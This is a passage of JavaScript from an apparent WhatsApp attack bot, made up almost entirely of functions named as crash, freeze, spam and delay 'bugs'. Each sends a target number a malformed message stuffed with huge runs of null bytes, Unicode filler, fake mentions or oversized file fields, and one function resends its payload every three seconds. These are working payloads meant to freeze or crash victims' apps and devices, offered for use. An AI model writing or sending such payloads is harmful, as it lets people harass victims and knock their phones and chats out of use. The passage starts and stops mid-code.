k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbvampCampaignId: "smb_vamp_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
    
 async function rexuscrashchat(target, Ptcp = false) {
      await sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Welcome Ryzz Infinity" + "\u0000".repeat(92000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ritzz For Me" + "\u0003".repeat(55555),
                body: "Awww Angkat Atuhh" + "𑜦࣯".repeat(2000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/RitzzAvailableV555",
                mediaUrl: "https://t.me/RitzzAvailableV555",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/RitzzAvailableV555",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbvampCampaignId: "smb_vamp_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }


       
async function RexusFreeze(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "⟅ 𝐄𝐕𝐎 🕷️ 𝐗͜ - 𝐄𝐋𝐋𝐄𝐍𝐓⟅ ༑ ▾" + "\u0000" + "ꦾ".repeat(92000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            groupMentions: [
                                {
                                    groupJid: "1@newsletter", 
                                    groupSubject: "UNDEFINED",  
                                    groupMetadata: {
                                        creationTimestamp: 1715880173,  
                                        ownerJid: "owner@newsletter",  
                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
                                    }
                                }
                            ],
                            externalContextInfo: {
                                customTag: "SECURE_PAYBUG_MESSAGE",  
                                securityLevel: "HIGH",  
                                referenceCode: "PAYBUG10291",  
                                timestamp: new Date().toISOString(),  
                                messageId: "MSG00123456789",  
                                userId: "UNDEFINED"  
                            },
                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗙𝗶𝗹𝗲",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    sock.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function RitzzSpamNotif(target, Ptcp = true) {
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "9999999999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "⟅ ༑ ▾𝐑͜𝐄͡𝐗͢𝐔͜𝐒 🕷️ 𝐗͜-𝐁͡𝐋͢𝐎͜𝐎͡𝐃͢𝐒⟅ ༑ ▾",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "⟅ ༑ ▾𝐑͜𝐄͡𝐗͢𝐔͜𝐒 🕷️ 𝐗͜-𝐁͡𝐋͢𝐎͜𝐎͡𝐃͢𝐒⟅ ༑ ▾" ,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}


async function RexusCrashNotif(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Rexus Bay Kucing",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function RexusExtremeCrash(target) {
    try {
        setInterval(async () => {
            let message = {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "AvailableMenjauh",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: [
                                {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(1000000), // Lebih besar biar makin freeze
                                    version: 3
                                },
                                {
                                    name: "mpm",
                                    paramsJson: "\u0000".repeat(7000),
                                    version: 3
                                },
                                {
                                    name: "payment_transaction_request",
                                    paramsJson: JSON.stringify({
                                        syncType: "full_sync",
                                        data: "\u0000".repeat(7000) // Paksa sinkronisasi besar
                                    }),
                                    version: 3
                                }
                            ]
                        }
                    }
                }
            };

            await sock.relayMessage(target, message, {
                participant: { jid: target },
            });

            console.log(`🔥 Crash bug dikirim ke ${target}`);
        }, 3000); // Kirim setiap 3 detik (lebih cepat dari 5 detik)

    } catch (err) {
        console.log(err);
    }
}

async function RitzzDeviceCrash(target, Ptcp = true) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "RyzzSystem",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "꧔꧈".repeat(9000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "", 
        text: "\u0000".repeat(1000000),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};

async function CrashRexusInvis(target, Ptcp = true) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "єνσυятн?? ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

async function RexusDelayMess(target, Ptcp = true) {
      await ritzz.relayMessage(tatget, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦\n" + "@15056662003".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'Iqbhalkeifer', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐯𝐬 𝐄𝐯𝐞𝐫𝐲𝐛𝐨𝐝𝐲",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, Ptcp ? {
        participant: {
          jid: target
        }
      } : {});
    }
    
async function RexusInvisChat(target, Ptcp = true) {
  const jids = `_*~@5~*_\n`.repeat(10500);
  const ui = "ꦽ".repeat(55555);
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "99999999999999",
              pageCount: 999999999,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗙𝗶𝗹𝗲",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
            },
            hasMediaAttachment: true
          },
          body: {
            text: "kenalin gw evourth"
          },
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net"],
            mentions: ["0@s.whatsapp.net"]
          },
          footer: {
            text: ""
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "99999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "𝙸𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}

async function RexusDelayCrash(sock, target) {
    const ritzz = "_*~@15056662003~*_\n".repeat(10200);
    const rexuss = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
